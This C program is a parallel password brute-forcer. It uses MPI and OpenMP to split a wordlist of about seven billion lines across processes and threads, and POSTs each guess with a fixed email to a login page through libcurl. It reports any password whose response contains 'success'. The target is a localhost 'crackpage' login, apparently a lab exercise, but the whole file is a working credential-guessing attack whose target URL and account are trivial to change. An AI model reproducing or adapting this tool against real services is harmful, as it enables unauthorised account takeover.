#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <time.h>
#include <mpi.h>
#include <omp.h>

#define LINE_SIZE 6 // Including the newline character
#define CHUNK_SIZE 100000

struct MemoryStruct {
    char *memory;
    size_t size;
    size_t allocated_size; // New member to track the allocated size of the memory buffer
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realSize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    // Check if the current buffer size is sufficient, if not, increase its size
    if (mem->size + realSize >= mem->allocated_size) {
        size_t new_size = mem->allocated_size * 2; // Double the size of the buffer
        char *ptr = realloc(mem->memory, new_size);
        if (ptr == NULL) {
            fprintf(stderr, "not enough memory (realloc returned NULL)\n");
            return 0; // Return 0 to signal an error to the calling function
        }
        mem->memory = ptr;
        mem->allocated_size = new_size;
    }

    // Copy the new data to the buffer and update the size
    memcpy(&(mem->memory[mem->size]), contents, realSize);
    mem->size += realSize;
    mem->memory[mem->size] = '\0'; // Null-terminate the buffer
    return realSize;
}

CURL *curl_init_session() {
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); // Enable cookie handling
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow HTTP redirects
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    }
    return curl;
}

int attempt_login(const char *url, const char *email, const char *password) {
    CURL *curl = curl_init_session();
    if (!curl) {
        fprintf(stderr, "Failed to initialize curl handle\n");
        return 0;
    }
    struct MemoryStruct chunk;
    chunk.memory = malloc(1024); // Initially allocate 1024 bytes
    chunk.size = 0;
    chunk.allocated_size = 1024;

    if (!chunk.memory) {
        fprintf(stderr, "Failed to allocate memory for chunk\n");
        curl_easy_cleanup(curl);
        return 0;
    }

    char postfields[256]; // Adjust size as needed
    sprintf(postfields, "signIn=true&email=%s&password=%s", email, password);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    CURLcode res = curl_easy_perform(curl);

    int success = 0;
    if(res == CURLE_OK) {
        long http_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        if (http_code == 200) {
            if (strstr(chunk.memory, "success")) {
                printf("Password found: %s\n", password);
                success = 1;
            }
        } else {
            printf("HTTP request failed with status code: %ld\n", http_code);
        }
    } else {
        fprintf(stderr, "CURL request failed for password '%s': %s\n", password, curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    free(chunk.memory);
    return success;
}

int main(int argc, char *argv[]) {
    clock_t start = clock();

    int rank, size;
    FILE *file;
    long total_lines = 6956883693;
    MPI_Init(&argc, &argv);
    MPI_Comm_rank(MPI_COMM_WORLD, &rank);
    MPI_Comm_size(MPI_COMM_WORLD, &size);
    
    // Calculate the number of chunks per processor
    long chunks_per_processor = (total_lines + CHUNK_SIZE - 1) / CHUNK_SIZE / size;

    // Initialize a variable to keep track of the total lines processed by each process
    long total_lines_processed = 0;

    // Calculate the starting line for each processor based on its rank
    long start_line = rank * chunks_per_processor * CHUNK_SIZE;
    
    

    //long lines_remaining = total_lines;
    while (total_lines_processed < chunks_per_processor * CHUNK_SIZE) {
        int lines_to_read = (total_lines - total_lines_processed > CHUNK_SIZE) ? CHUNK_SIZE : total_lines - total_lines_processed;
        char *lines_buffer = (char *)malloc(lines_to_read * LINE_SIZE * sizeof(char));

        if (!lines_buffer) {
            fprintf(stderr, "Failed to allocate memory for lines buffer\n");
            MPI_Abort(MPI_COMM_WORLD, 1);
        }

        file = fopen("possible_passwords.txt", "r");
        if (file == NULL) {
            fprintf(stderr, "Could not open the file.\n");
            MPI_Abort(MPI_COMM_WORLD, 1);
        }
        fseek(file, start_line * LINE_SIZE, SEEK_SET);
        long lines_read = fread(lines_buffer, LINE_SIZE, lines_to_read, file);

        // Print the first line of the chunk
        char *first_line_end = strchr(lines_buffer, '\n');
        if (first_line_end != NULL) {
            *first_line_end = '\0'; // Temporarily null-terminate the string
            printf("Process %d first line: %s\n", rank, lines_buffer);
            *first_line_end = '\n'; // Restore the newline character
        }

        // Print the last line of the chunk
        char *last_line_start = lines_buffer + (lines_read - 1) * LINE_SIZE;
        char *last_line_end = strrchr(last_line_start, '\n');
        if (last_line_end != NULL) {
            printf("Process %d last line: %s\n", rank, last_line_start);
        }

        // Update the total_lines_processed for the next iteration
        total_lines_processed += lines_read;
        printf("Process %d allocated %ld lines.\n", rank, lines_read);
        printf("--------------------------------------------------\n");

        // Move to the next chunk for the next iteration
        start_line += CHUNK_SIZE;
        
        #pragma omp parallel for
        for (long i = 0; i < lines_read; ++i) {
            char *current_line = lines_buffer + i * LINE_SIZE;
            current_line[LINE_SIZE - 1] = '\0'; // Ensure null-termination
            //printf("%s\n", current_line);

            if (attempt_login("http://localhost:81/crackpage/login/register.php", "s.h@test.com", current_line) == 1){
            	printf("Process %d thread %d found this password.\n", rank, omp_get_thread_num());
            	clock_t end = clock();
    		double total_time = ((double) (end-start))/CLOCKS_PER_SEC;

    		printf("Total run time: %f\n", total_time);
                // printf("Password found: %s\n", current_line);
                // Consider using a more controlled way to stop the program, e.g., setting a flag and checking it in the loop
                MPI_Abort(MPI_COMM_WORLD, 1);
            }
            
        }

        free(lines_buffer);
    }

    MPI_Finalize();

    clock_t end = clock();
    double total_time = ((double) (end-start))/CLOCKS_PER_SEC;

    printf("Total run time: %f\n", total_time);

    return 0;
}
